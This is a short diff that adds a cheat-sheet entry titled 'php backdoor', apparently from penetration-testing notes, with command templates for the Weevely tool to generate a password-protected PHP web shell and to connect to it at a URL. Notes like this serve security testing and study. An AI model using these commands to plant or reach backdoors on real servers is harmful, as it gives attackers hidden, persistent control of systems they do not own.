@@ -1,0 +1,3 @@
+### php backdoor ###
+weevly generate [password] [file name] - generate backdoor
+weevly [url to file] [password] - connect to backdoor
